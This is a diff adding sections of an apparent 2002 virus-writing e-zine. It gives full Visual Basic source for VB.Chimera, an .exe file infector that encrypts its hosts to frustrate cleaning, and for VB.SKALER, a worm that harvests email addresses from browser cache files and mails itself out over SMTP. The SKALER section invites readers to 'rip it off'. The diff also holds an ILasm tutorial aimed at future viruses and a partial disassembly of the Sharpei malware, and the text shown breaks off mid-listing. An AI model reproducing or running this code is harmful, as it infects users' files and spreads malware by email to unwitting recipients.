@@ -330,3 +330,1312 @@ alco
 
 --------------
 Signature string that will be appended to the virus - alco
+
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+VB.CHIMERA by alcopaul\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+hello vb fans... :) ... i would like to present another virus..
+
+VB.Chimera is a slow infector.... it infects one ".exe" file in current directory per virus run... it's designed to infect
+all ".exe" files in current directory... infected hosts are encrypted by the virus so AVs will find it difficult to 
+reconstruct or "clean" the infected files... even though the host is encrypted, the virus wonderfully regenerates the
+host and executes it (using vb5 virus method of executing hosts by Murkry) thus users won't recognize anything wrong 
+except the similar icons....
+
+the compiled executable of the source won't immediately infect exe files (thus satisfying the definition of a biological
+virus that it cannot function by itself)... you'll surely get some errors... if this happens, this means that the virus is
+infecting itself (since the compiled executable doesn't contain the signature "APO" yet). but once the virus has infected 
+a file (not itself), the infection will continue smoothly... but if you want it to werk without errors, 
+just add the "APO" signature to the compiled file using copy /b...
+
+end don't forget to compress it using upx 1.22 so the virus constant in the code and the size of the compiled executable
+bytes will jive..
+
+virus size = 6144... comparable to the size of some win32asm pe infector...
+
+
+\\\\\\\\\\\\\\\\\\
+the source\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\
+
+-----------------------------------------------------------------------------------------------------------------------------
+Attribute VB_Name = "Module1"
+Option Explicit
+Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
+Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
+Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+Private hostX As Long
+Private ID As Long
+Private fuckoff As Long
+Const aktibo As Long = &H103
+Const allproc As Long = &H1F0FFF
+Sub Main()
+On Error Resume Next
+Dim virpath As String
+Dim hosts1 As String
+Dim a As String
+Dim syra, genna
+Dim hlen As String, vsig As String, marker As String
+virpath = App.Path
+If Right(virpath, 1) <> "\" Then virpath = virpath & "\"
+hosts1 = Dir$(virpath & "*.exe")
+While hosts1 <> ""
+a = a & hosts1 & "/"
+hosts1 = Dir$
+Wend
+syra = Split(a, "/")
+For Each genna In syra
+Open virpath & genna For Binary Access Read As #1
+hlen = (LOF(1))
+vsig = Space(hlen)
+Get #1, , vsig
+Close #1
+marker = Right(vsig, 3)
+If marker <> "APO" Then
+GoTo notinfected
+Else
+GoTo infected
+End If
+notinfected:
+inphecxion (virpath & genna)
+Exit For
+infected:
+Next genna
+reghost (virpath & App.EXEName & ".exe")
+End Sub
+Function inphecxion(goat As String)
+On Error Resume Next
+Dim hostbyte1 As String
+Dim virbyte1 As String
+Dim virpath As String
+Dim sig As String
+Dim enchost As String
+virpath = App.Path
+If Right(virpath, 1) <> "\" Then virpath = virpath & "\"
+Open goat For Binary Access Read As #1
+hostbyte1 = Space(LOF(1))
+Get #1, , hostbyte1
+Close #1
+Open virpath & App.EXEName & ".exe" For Binary Access Read As #2
+virbyte1 = Space(6144)
+Get #2, , virbyte1
+Close #2
+sig = "APO"
+enchost = x(hostbyte1)
+Open goat For Binary Access Write As #3
+Put #3, , virbyte1
+Put #3, , enchost
+Put #3, , sig
+Close #3
+End Function
+Function reghost(goat As String)
+On Error Resume Next
+Dim hostbyte2 As String
+Dim virbyte2 As String
+Dim virpath As String
+Dim dechost As String
+virpath = App.Path
+If Right(virpath, 1) <> "\" Then virpath = virpath & "\"
+Open goat For Binary Access Read As #1
+virbyte2 = Space(6144)
+hostbyte2 = Space(LOF(1) - 6144)
+Get #1, , virbyte2
+Get #1, , hostbyte2
+Close #1
+dechost = x(hostbyte2)
+Open virpath & "apo.com" For Binary Access Write As #2
+Put #2, , dechost
+Close #2
+ID = Shell(virpath & "apo.com", vbNormalFocus)
+hostX = OpenProcess(allproc, False, ID)
+GetExitCodeProcess hostX, fuckoff
+Do While fuckoff = aktibo
+DoEvents
+GetExitCodeProcess hostX, fuckoff
+Loop
+Kill virpath & "apo.com"
+End Function
+Function x(sText As String)
+On Error Resume Next
+Dim ekey As Long, i As Long
+Dim hash As String, crbyte As String
+ekey = 4380
+For i = 1 To Len(sText)
+hash = Asc(Mid(sText, i, 1))
+crbyte = Chr(hash Xor (ekey Mod 255))
+x = x & crbyte
+Next i
+End Function
+-----------------------------------------------------------------------------------------------------------------------------
+
+
+that's all for now...
+
+\\\\\\\\\\\\\\\\\\\\\
+alcopaul\\\\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\
+july 18, 2002\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\
+the philippines\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+greets : arkhangel, philetoaster/[rRlf], PetiK (mail me!), Lord Julus/[TKT], ebcvg, brigada8, mAniaC89/[b8], Zirkov/[b8],
+         jackie, Dr. T, Alpha Phi Omega International Collegiate Service Fraternity, ETA chapter, Philippines, VirusBuster,
+	 IllAwesome, my little sister, Syra, my parents and my girlfriend Janis...
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+Rip it off, kids : Presenting VB.SKALER by alcopaul  \\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+all of my previous worms uses outlook to propagate via e-mail... one time, i revisited my past and viewed my old creations 
+and thought that i'm really a lame ass then.... but not anymore... :D
+
+This is my first SMTP worm that sends itself to the e-mail addresses contained in htm and html files located in
+Temporary Internet Files folder... And the first SMTP Visual Basic worm to be featured in an e-zine, i think 
+(Slap me if i'm thinkin' wrongly...  :) I've modified PetiK's technique of collecting e-mail addresses (Thankie PetiK! :) ),
+so the collected e-mail addresses will be a valid e-mail addy... If the collected e-mail addy contains "?", it will be
+replaced by a bogus e-mail addy, but with a valid syntax...
+
+I was thinkin of putting the MIME sploit in here but i thought that it would not be cool coz the sploit is too way archaic..
+:P... Waiting for the automatic execution via HTML sploit... heheheheheh
+
+and also thankie to a VB programmer (you know who you are.. just look at b64 function.. :) ) for the base64 routine....
+
+i'm expecting to break even with the number of VC++ smtp worms.... it depends to you, VB enthusiasts... you can
+enhance this code.. put some Internet Connexion Checking and stuff... Check the registry for some smtp server, sender
+name and e-mail addy... cool payloads... file infection.. backdoor capabilities... keylogging... etc....
+
+"Watch out, VB worms are coming to your mailboxes!"
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+the source \\\\\\\\\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+TADA! Rip it off, kids... hehheheheh
+
+-----------------------------------------------------------------------------------------------------------------------------
+VERSION 5.00
+Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
+Begin VB.Form Form1 
+   Caption         =   "Form1"
+   ClientHeight    =   3195
+   ClientLeft      =   60
+   ClientTop       =   345
+   ClientWidth     =   4680
+   LinkTopic       =   "Form1"
+   ScaleHeight     =   3195
+   ScaleWidth      =   4680
+   StartUpPosition =   3  'Windows Default
+   Begin MSWinsockLib.Winsock Winsock1 
+      Left            =   1200
+      Top             =   840
+      _ExtentX        =   741
+      _ExtentY        =   741
+      _Version        =   393216
+   End
+End
+Attribute VB_Name = "Form1"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Option Explicit
+Private Response As String
+Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long
+Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
+Const CSIDL_TIF = &H20
+Private Type SHITEMID
+cb As Long
+abID As Byte
+End Type
+Private Type ITEMIDLIST
+mkid As SHITEMID
+End Type
+Private Sub Form_Load()
+On Error Resume Next
+Kill "c:\t.txt"
+listht GetSpecialfolder(CSIDL_TIF)
+transmit ("mail.lycos.com") ' <<<<<<<<<if this ain't work, find another mail server>>>>>>>>>>>
+Unload Me
+End Sub
+Function transmit(ByVal b8 As String)
+Dim q As String, a As String, textline As String
+Dim www, ggg
+Winsock1.LocalPort = 0
+If Winsock1.State = sckClosed Then
+Winsock1.Protocol = sckTCPProtocol
+Winsock1.RemoteHost = b8
+Winsock1.RemotePort = 25
+Winsock1.Connect
+W4C ("220")
+Winsock1.SendData "HELO localhost" & vbCrLf
+W4C ("250")
+Winsock1.SendData "MAIL FROM:" & " <" + "skaler@hotmail.com" + ">" & vbCrLf
+W4C ("250")
+Open "c:\t.txt" For Input As #1
+Do While Not EOF(1)
+Line Input #1, textline
+q = q & textline
+Loop
+Close #1
+a = Trim(q)
+www = Split(a, ";")
+For Each ggg In www
+If ggg = "" Then
+ggg = "blah@h.net"
+End If
+If InStr(1, ggg, "@") Then
+Else
+ggg = "faggot@fillme.com"
+End If
+If InStr(1, ggg, "?") Then
+ggg = "juana12234@yahoo.com"
+End If
+Winsock1.SendData "RCPT TO: " & "<" & ggg & ">" & vbCrLf
+W4C ("250")
+Next ggg
+Winsock1.SendData "DATA" & vbCrLf
+W4C ("354")
+Winsock1.SendData hd & vbCrLf
+Winsock1.SendData "<html>Oi, oi, oi! Wanna hear me play ska? Check this out....</html>" & vbCrLf
+Winsock1.SendData a12()
+Winsock1.SendData vbCrLf & "." & vbCrLf
+W4C ("250")
+Winsock1.SendData "QUIT" & vbCrLf
+W4C ("221")
+Winsock1.Close
+transmit = True
+Else
+End If
+End Function
+Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
+Winsock1.GetData Response
+End Sub
+Private Sub W4C(ResponseCode As String)
+Dim TT As Single
+Dim TTT As Single
+TT = Timer
+While Len(Response) = 0
+TTT = TT - Timer
+DoEvents
+If TTT > 24 Then
+Exit Sub
+End If
+Sleep 1
+Wend
+While Left(Response, 3) <> ResponseCode
+DoEvents
+If TTT > 50 Then
+Exit Sub
+End If
+Sleep 1
+Wend
+Response = ""
+End Sub
+Sub listht(dir)
+On Error Resume Next
+Dim fso, ssfh, filh, s, f, d, q, a, textline
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set ssfh = fso.GetFolder(dir).SubFolders
+For Each filh In ssfh
+s = infht(filh.path)
+listht (filh.path)
+If s = "" Then
+s = "fuck@well.com"
+End If
+f = f & s & ";"
+Next
+d = f
+Open "c:\t.txt" For Append As #1
+Print #1, d
+Close #1
+End Sub
+Function infht(dir)
+Dim mlto As String
+Dim fso, cfh, filh, ext, textline, q, wwww
+Dim j As Long, cnt As Long
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set cfh = fso.GetFolder(dir).Files
+For Each filh In cfh
+ext = fso.GetExtensionName(filh.path)
+ext = LCase(ext)
+If (ext = "htm") Or (ext = "html") Then
+Open filh.path For Input As #1
+Do While Not EOF(1)
+Line Input #1, textline
+q = q & textline
+Loop
+Close #1
+For j = 1 To Len(q)
+If Mid(q, j, 8) = """" & "mailto:" Then
+mlto = ""
+cnt = 0
+Do While Mid(q, j + 8 + cnt, 1) <> """"
+mlto = mlto + Mid(q, j + 8 + cnt, 1)
+cnt = cnt + 1
+Loop
+wwww = wwww & mlto & ";"
+End If
+Next
+End If
+Next
+infht = wwww
+End Function
+Private Function GetSpecialfolder(CSIDL As Long) As String
+Dim r As Long
+Dim IDL As ITEMIDLIST
+Dim path As String
+r = SHGetSpecialFolderLocation(100, CSIDL, IDL)
+If r = 0 Then
+path$ = Space$(512)
+r = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal path$)
+GetSpecialfolder = Left$(path, InStr(path, Chr$(0)) - 1)
+Exit Function
+End If
+GetSpecialfolder = ""
+End Function
+Private Function hd() As String
+Dim fin As String, dh As String, recip As String
+Dim sdatenow As String, deit As String, phrom As String, topic As String, engine As String, myme As String
+sdatenow = Format(Date, "Ddd") & ", " & Format(Date, "dd Mmm YYYY") & " " & Format(Time, "hh:mm:ss")
+recip = "To: Subscribers" & vbCrLf
+deit = "Date:" + Chr(32) + sdatenow + vbCrLf
+phrom = "From: " & Chr(34) & "Chief Skaler" & Chr(34) & " <webmaster@skaler.com>" + vbCrLf
+topic = "Subject:" + Chr(32) + "hello world" + vbCrLf
+engine = "X-Mailer: mailsux9855097" + vbCrLf
+myme = "MIME-Version: 1.0" & vbCrLf & _
+"Content-Type: multipart/related; boundary=" & _
+Chr(34) & "blimp" & Chr(34) & "; type=" & Chr(34) & _
+"text/html" & Chr(34) & vbCrLf & _
+"by:alcotheSkaler" & vbCrLf & _
+"--blimp" & vbCrLf & _
+"Content-Type: text/html; charset=us-ascii" & vbCrLf & _
+"Content-Transfer-Encoding: 7bit" & vbCrLf
+dh = phrom & deit & engine & recip & topic & myme
+hd = dh
+End Function
+Private Function a12() As String
+Dim fin As String
+Dim phile as String
+Dim ss as string
+ss = App.Path
+if Right(ss,1) <> "\" then ss = ss & "\"
+fin = fin & e32(ss & app.exename & ".exe")
+fin = fin & vbCrLf & "--blimp--" & vbCrLf
+a12 = fin
+End Function
+Public Function e32(ByVal vsFullPathname As String) As String
+Dim fin As String
+fin = vbCrLf & "--blimp" & vbNewLine
+fin = fin & "Content-Type: application/octet-stream; name=" & Chr(34) & "mp3skaler.exe" & Chr(34) & vbNewLine
+fin = fin & "Content-Transfer-Encoding: base64" & vbNewLine
+fin = fin & "Content-Disposition: attachment; filename=" & Chr(34) & "mp3skaler.exe" & Chr(34) & vbNewLine
+fin = fin & b64(vsFullPathname)
+e32 = fin
+End Function
+Public Function b64(ByVal vsFullPathname As String) As String
+    'For Encoding BASE64
+    Dim b           As Integer
+    Dim Base64Tab   As Variant
+    Dim bin(3)      As Byte
+    Dim s           As String
+    Dim l           As Long
+    Dim i           As Long
+    Dim FileIn      As Long
+    Dim sResult     As String
+    Dim n           As Long
+    
+    'Base64Tab=>tabla de tabulación
+    Base64Tab = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")
+    
+    Erase bin
+    l = 0: i = 0: FileIn = 0: b = 0:
+    s = ""
+    
+    'Gets the next free filenumber
+    FileIn = FreeFile
+    
+    'Open Base64 Input File
+    Open vsFullPathname For Binary As FileIn
+    
+    sResult = s & vbCrLf
+    s = ""
+    
+    l = LOF(FileIn) - (LOF(FileIn) Mod 3)
+    
+    For i = 1 To l Step 3
+
+        'Read three bytes
+        Get FileIn, , bin(0)
+        Get FileIn, , bin(1)
+        Get FileIn, , bin(2)
+        
+        'Always wait until there're more then 64 characters
+        If Len(s) > 64 Then
+
+            s = s & vbCrLf
+            sResult = sResult & s
+            s = ""
+
+        End If
+
+        'Calc Base64-encoded char
+        b = (bin(n) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
+        s = s & Base64Tab(b) 'the character s holds the encoded chars
+        
+        b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
+        s = s & Base64Tab(b)
+        
+        b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
+        s = s & Base64Tab(b)
+        
+        b = bin(n + 2) And &H3F
+        s = s & Base64Tab(b)
+        
+    Next i
+
+    'Now, you need to check if there is something left
+    If Not (LOF(FileIn) Mod 3 = 0) Then
+
+        'Reads the number of bytes left
+        For i = 1 To (LOF(FileIn) Mod 3)
+            Get FileIn, , bin(i - 1)
+        Next i
+    
+        'If there are only 2 chars left
+        If (LOF(FileIn) Mod 3) = 2 Then
+            b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
+            s = s & Base64Tab(b)
+            
+            b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
+            s = s & Base64Tab(b)
+            
+            b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
+            s = s & Base64Tab(b)
+            
+            s = s & "="
+        
+        Else 'If there is only one char left
+            b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
+            s = s & Base64Tab(b)
+            
+            b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
+            s = s & Base64Tab(b)
+            
+            s = s & "=="
+        End If
+    End If
+
+    'Send the characters left
+    If s <> "" Then
+        s = s & vbCrLf
+        sResult = sResult & s
+    End If
+    
+    'Send the last part of the MIME Body
+    s = ""
+    
+    Close FileIn
+    b64 = sResult
+    
+End Function
+-----------------------------------------------------------------------------------------------------------------------------
+
+
+SMTP... I thought it was hard but it's way too easy....
+
+
+\\\\\\\\\\\\\\\\\
+alcopaul\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\
+july 18, 2002 \\\\\\
+\\\\\\\\\\\\\\\\\\\\\
+the philippines\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\
+
+greets : arkhangel, philetoaster/[rRlf], PetiK (mail me!), Lord Julus/[TKT], ebcvg, brigada8, mAniaC89/[b8], Zirkov/[b8],
+         jackie, Dr. T, Alpha Phi Omega International Collegiate Service Fraternity, ETA chapter, Philippines, VirusBuster
+	 IllAwesome, my little sister(Syra), my parents and my girlfriend Janis ("love you so much")...
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\
+Hello World! in Ilasm \\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+for you to understand what i'm talkin' about, you must download .NET Software Development Kit From Microsoft...
+and be sure to study the help files and essential documents from the SDK
+
+What is MSIL?
+
+"Microsoft Intermediate Language (MSIL)
+
+When compiling to managed code, the compiler translates your source code into Microsoft intermediate language (MSIL), 
+which is a CPU-independent set of instructions that can be efficiently converted to native code. MSIL includes 
+instructions for loading, storing, initializing, and calling methods on objects, as well as instructions for 
+arithmetic and logical operations, control flow, direct memory access, exception handling, and other operations. 
+Before code can be executed, MSIL must be converted to CPU-specific code by a just in time (JIT) compiler. 
+Because the runtime supplies one or more JIT compilers for each computer architecture it supports, the same set of 
+MSIL can be JIT-compiled and executed on any supported architecture.
+
+When a compiler produces MSIL, it also produces metadata. Metadata describes the types in your code, 
+including the definition of each type, the signatures of each type's members, the members that your code references, 
+and other data that the runtime uses at execution time. The MSIL and metadata are contained in a portable executable 
+(PE file) that is based on and extends the published Microsoft PE and Common Object File Format (COFF) used historically 
+for executable content. This file format, which accommodates MSIL or native code as well as metadata, enables the 
+operating system to recognize common language runtime images. The presence of metadata in the file along with the 
+MSIL enables your code to describe itself, which means that there is no need for type libraries or Interface 
+Definition Language (IDL). The runtime locates and extracts the metadata from the file as needed during execution."
+
+What is Ilasm?
+
+"MSIL Assembler (Ilasm.exe) Generates a PE file from Microsoft intermediate language (MSIL). You can 
+run the resulting executable, which contains MSIL code and the required metadata, to determine 
+whether the MSIL code performs as expected."
+
+Why Ilasm and not C#, C++.NET, VB.NET or Jscript.NET?
+
+coz Ilasm is a new ground and only a few documentations for it exist.... In short, Ilasm is challenging and worth studying..
+...
+
+
+brief...
+
+
+save as helloconsole.il
+ilasm helloconsole.il /exe
+----------------------------------------------------------------------------
+
+.assembly hello {}
+
+.method static public void main() cil managed
+{
+.entrypoint
+.maxstack 1
+ldstr  "Hello World!"
+call   void [mscorlib]System.Console::WriteLine(class System.String)
+ret
+}
+
+
+
+-----------------------------------------------------------------------------
+
+executing helloconsole.exe will display Hello World! in MS-DOS console...
+
+
+save as msgbox.il
+ilasm msgbox.il /exe
+-----------------------------------------------------------------------------
+.module extern user32
+.assembly msgbox{}
+
+.class public Win32
+
+{
+  .method public hidebysig static pinvokeimpl("user32.dll" autochar winapi) 
+          int32  MessageBox(int32 hWnd,
+                            string text,
+                            string caption,
+                            unsigned int32 type) cil managed preservesig
+  {
+  }
+}
+
+.class public Hello
+{
+.method static public void main() cil managed
+{
+.entrypoint
+.maxstack 8
+ldc.i4.0
+ldstr "Hello World!"
+ldstr "from IllAwesome"
+ldc.i4.0
+call  int32 Win32::MessageBox(int32,
+                              string,
+                              string,
+                              unsigned int32)
+pop
+ret
+}
+}
+
+------------------------------------------------------------------------------
+
+executing msgbox.exe will display the msdos console window and then display the messagebox,
+
+--------------------
+from IllAwesome
+--------------------
+Hello World!
+--------------------
+
+to be able to understand IL assembly language well, you must read the documents in 
+
+\Program Files\Microsoft.NET\FrameworkSDK\Tool Developers Guide\docs
+
+then learn C#, C++.NET, VB.NET or Jscript.NET, write
+programs for those said languages, compile them and disassemble the compiled programs using ILDasm...
+
+What is ILDasm?
+
+"MSIL Disassembler (Ildasm.exe) Takes a PE file that contains MSIL code and creates a text file suitable as input 
+to the MSIL Assembler (Ilasm.exe). "
+
+then if you're an expert in reading disassemblies, you'll now be able to write IL assembly codes...
+
+people in the past did reverse engineering of viruses and became experts in virus coding... :)
+
+.NET is the future!
+
+Hello World for now, tomorrow, IL viruses !!
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+by : IllAwesome\\\\\\\\\\\\\\\\\\
+7152002\\\\\\\\\\\\\\\\\\\\\\\\\\\
+"IL Asm is the pyucha..."\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+Disassembling Sharpei, the 1st C# malware...\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+I can't wait to see the source code of the 1st C# malware so i decided to download the binary
+of the Sharpei virus from Gigabyte's homepage....
+
+i analysed the structure using notepad and i found out that the malware is layered this way...
+
+--------------------------------------------------------
+Win32asm Header | VBS mass mailer | C# code
+--------------------------------------------------------
+
+so isolating the C# component is so easy...
+
+
+presenting the disassembly of C# component of sharpei....
+
+---------------------------------------------------------------------------------------------------------------------
+//  Microsoft (R) .NET Framework IL Disassembler.  Version 1.0.2914.16
+//  Copyright (C) Microsoft Corp. 1998-2001. All rights reserved.
+
+// VTableFixup Directory:
+// No data.
+.assembly extern mscorlib
+{
+  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
+  .ver 1:0:3300:0
+}
+.assembly extern System
+{
+  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
+  .ver 1:0:3300:0
+}
+.assembly Sharp
+{
+  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
+  .custom instance void [mscorlib]System.Reflection.AssemblyKeyFileAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
+  .custom instance void [mscorlib]System.Reflection.AssemblyDelaySignAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
+  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
+  .custom instance void [mscorlib]System.Reflection.AssemblyKeyNameAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
+  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
+  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
+  .custom instance void [mscorlib]System.Reflection.AssemblyConfigurationAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
+  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
+  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
+  .hash algorithm 0x00008004
+  .ver 1:0:786:36587
+}
+.mresource public Sharp.Sharp.resources
+{
+}
+.module Sharp.exe
+// MVID: {832C42CB-10F1-4F43-B7C9-86EB93BDBDB7}
+.imagebase 0x00400000
+.subsystem 0x00000002
+.file alignment 512
+.corflags 0x00000001
+// Image base: 0x8264d000
+.namespace Sharp
+{
+  .class public auto ansi beforefieldinit Sharp
+         extends [mscorlib]System.Object
+  {
+    .field private static string virname
+    .method private hidebysig static void 
+            Main() cil managed
+    {
+      .entrypoint
+      .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
+      // Code size       362 (0x16a)
+      .maxstack  5
+      .locals init (string V_0,
+               class [mscorlib]System.IO.FileInfo V_1,
+               class [mscorlib]System.IO.StreamWriter V_2,
+               string V_3,
+               string V_4,
+               string[] V_5,
+               class [mscorlib]System.IO.FileStream V_6,
+               class [mscorlib]System.IO.FileStream V_7,
+               unsigned int8[] V_8,
+               int64 V_9,
+               class [System]System.Diagnostics.Process V_10)
+      IL_0000:  ldc.i4.7
+      IL_0001:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
+      IL_0006:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
+      IL_000b:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
+      IL_0010:  stloc.0
+      IL_0011:  ldloc.0
+      IL_0012:  ldstr      "\\Sharp.vbs"
+      IL_0017:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string)
+      IL_001c:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
+      IL_0021:  stloc.1
+      IL_0022:  ldloc.1
+      IL_0023:  callvirt   instance class [mscorlib]System.IO.StreamWriter [mscorlib]System.IO.FileInfo::CreateText()
+      IL_0028:  stloc.2
+      IL_0029:  ldloc.2
+      IL_002a:  ldstr      "MsgBox \"You're infected with Win32.HLLP.Sharp, wri"
+      + "tten in C#, by Gigabyte/Metaphase\",64,\"Sharp\""
+      IL_002f:  callvirt   instance void [mscorlib]System.IO.TextWriter::Write(string)
+      IL_0034:  ldloc.2
+      IL_0035:  callvirt   instance void [mscorlib]System.IO.TextWriter::Close()
+      IL_003a:  call       string [mscorlib]System.Environment::get_SystemDirectory()
+      IL_003f:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
+      IL_0044:  call       instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
+      IL_0049:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
+      IL_004e:  stloc.3
+      IL_004f:  ldc.i4.s   38
+      IL_0051:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
+      IL_0056:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
+      IL_005b:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
+      IL_0060:  stloc.s    V_4
+      IL_0062:  ldloc.s    V_4
+      IL_0064:  ldstr      "*.*"
+      IL_0069:  call       string[] [mscorlib]System.IO.Directory::GetDirectories(string,
+                                                                                  string)
+      IL_006e:  stloc.s    V_5
+      IL_0070:  ldloc.3
+      IL_0071:  call       void Sharp.Sharp::FileSearch(string)
+      IL_0076:  ldloc.s    V_5
+      IL_0078:  ldc.i4.s   11
+      IL_007a:  ldelem.ref
+      IL_007b:  call       void Sharp.Sharp::FileSearch(string)
+      IL_0080:  ldloc.s    V_5
+      IL_0082:  ldc.i4.s   12
+      IL_0084:  ldelem.ref
+      IL_0085:  call       void Sharp.Sharp::FileSearch(string)
+      IL_008a:  ldloc.s    V_5
+      IL_008c:  ldc.i4.s   13
+      IL_008e:  ldelem.ref
+      IL_008f:  call       void Sharp.Sharp::FileSearch(string)
+      IL_0094:  ldsfld     string Sharp.Sharp::virname
+      IL_0099:  ldc.i4.3
+      IL_009a:  ldc.i4.1
+      IL_009b:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
+                                                                               valuetype [mscorlib]System.IO.FileMode,
+                                                                               valuetype [mscorlib]System.IO.FileAccess)
+      IL_00a0:  stloc.s    V_6
+      IL_00a2:  ldstr      "temp.exe"
+      IL_00a7:  ldc.i4.4
+      IL_00a8:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
+                                                                               valuetype [mscorlib]System.IO.FileMode)
+      IL_00ad:  stloc.s    V_7
+      IL_00af:  ldloc.s    V_6
+      IL_00b1:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length()
+      IL_00b6:  conv.i4
+      IL_00b7:  ldc.i4     0x3000
+      IL_00bc:  sub
+      IL_00bd:  conv.ovf.u4
+      IL_00be:  newarr     [mscorlib]System.Byte
+      IL_00c3:  stloc.s    V_8
+      IL_00c5:  ldloc.s    V_6
+      IL_00c7:  ldc.i4     0x3000
+      IL_00cc:  conv.i8
+      IL_00cd:  ldc.i4.0
+      IL_00ce:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
+                                                                           valuetype [mscorlib]System.IO.SeekOrigin)
+      IL_00d3:  pop
+      IL_00d4:  ldloc.s    V_6
+      IL_00d6:  ldloc.s    V_8
+      IL_00d8:  ldc.i4.0
+      IL_00d9:  ldloc.s    V_6
+      IL_00db:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length()
+      IL_00e0:  conv.i4
+      IL_00e1:  ldc.i4     0x3000
+      IL_00e6:  sub
+      IL_00e7:  callvirt   instance int32 [mscorlib]System.IO.Stream::Read(unsigned int8[],
+                                                                           int32,
+                                                                           int32)
+      IL_00ec:  pop
+      IL_00ed:  ldloc.s    V_7
+      IL_00ef:  ldloc.s    V_8
+      IL_00f1:  ldc.i4.0
+      IL_00f2:  ldloc.s    V_6
